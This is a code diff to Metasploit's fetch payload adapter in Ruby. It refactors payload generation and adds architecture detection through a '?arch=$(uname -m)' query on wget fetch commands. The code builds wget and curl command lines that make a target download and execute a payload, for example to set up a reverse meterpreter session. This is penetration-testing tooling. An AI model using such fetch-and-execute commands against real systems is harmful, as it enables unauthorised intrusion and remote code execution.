@@ -105,10 +105,9 @@ module Msf::Payload::Adapter::Fetch
     datastore['FetchListenerBindPort'].blank? ? srvport : datastore['FetchListenerBindPort']
   end
 
-  def add_srv_entry(uri, data, arch = ARCH_CMD)
-    vprint_status "#{__LINE__}"
+  def add_srv_entry(uri, data, opts)
     srv_entry = {
-      :arch => arch,
+      :opts => opts,
       :uri => uri,
       :data => data
     }
@@ -132,37 +131,46 @@ module Msf::Payload::Adapter::Fetch
     %w[WGET GET CURL]
   end
 
-  # Builds an adapted payload executable, starts any required pipe command state,
-  # and returns the remote command that should fetch and execute the payload.
-  #
-  # @param opts [Hash] Payload generation options.
-  # @return [String] The fetch command to run on the target.
   def generate(opts = {})
-    vprint_status "#{__method__}"
-    vprint_status "#{__LINE__}"
+    if opts[:dynamic_arch].nil?
+      # on the first call, dynamic_arch should not be set, so just move along
+      generate_fetch(opts)
+    else
+      # we've already generated the fetch command stuff but we did not know the
+      # arch until we got the http request from a multi/meterpreter_reverse_tcp payload.
+      # now, we just call super because the real arch is already in opts[:arch]
+      super(opts)
+    end
+  end
+
+
+  def generate_fetch(opts = {})
+    vprint_status("#{__method__}:#{__LINE__}")
     opts[:arch] ||= module_info['AdaptedArch']
-    @payload_opts = opts[:arch]
-    dynamic_arch = false
     vprint_status "#{__LINE__}"
     if opts[:arch] == ARCH_ANY && module_info['AdaptedPlatform'] == 'linux'
       vprint_status "#{__LINE__}"
-      dynamic_arch = true
+      opts[:dynamic_arch] = true
+      # if we don't have a valid arch, let's just put a placeholder in the data location
       add_srv_entry(srvuri, 'x', opts)
     else
       vprint_status "#{__LINE__}"
-      dynamic_arch = false
+      opts[:dynamic_arch] = false
+      super(opts)
+      # if we do have a valid arch, let's generate it now
+      # so if it fails we know before the exploit runs
       add_srv_entry(srvuri, generate_payload_exe(opts), opts)
     end
 
     vprint_status "#{__LINE__}"
-    cmd = generate_fetch_commands(srvuri, dynamic_arch)
+    cmd = generate_fetch_commands(srvuri, opts[:dynamic_arch])
     if datastore['FETCH_PIPE']
       vprint_status "#{__LINE__}"
       unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
         fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
       end
       cmd << '\n' if windows? # Needs CR for Windows command
-      add_srv_entry(pipe_srvuri, cmd)
+      add_srv_entry(pipe_srvuri, cmd, opts)
       cmd = generate_pipe_command(pipe_srvuri)
     end
     vprint_status "#{__LINE__}"
@@ -183,7 +191,7 @@ module Msf::Payload::Adapter::Fetch
     when 'TNFTP'
       return _generate_tnftp_command(uri)
     when 'WGET'
-      return _generate_wget_command(uri)
+      return _generate_wget_command(uri, dynamic_arch)
     when 'CURL'
       return _generate_curl_command(uri, dynamic_arch)
     when 'TFTP'
@@ -500,15 +508,17 @@ module Msf::Payload::Adapter::Fetch
   # Builds a wget-based command line for fetching the payload.
   #
   # @return [String] The wget fetch-and-execute command.
-  def _generate_wget_command
+  def _generate_wget_command(uri, dynamic_arch)
     case fetch_protocol
     when 'HTTPS'
-      get_file_cmd = "wget -qO #{_remote_destination} --no-check-certificate https://#{download_uri}"
+      get_file_cmd = "wget -qO #{_remote_destination} --no-check-certificate https://#{download_uri(uri)}"
+
     when 'HTTP'
-      get_file_cmd = "wget -qO #{_remote_destination} http://#{download_uri}"
+      get_file_cmd = "wget -qO #{_remote_destination} http://#{download_uri(uri)}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
+    get_file_cmd << "?arch=$(uname -m)" if dynamic_arch
     _execute_add(get_file_cmd)
   end
 
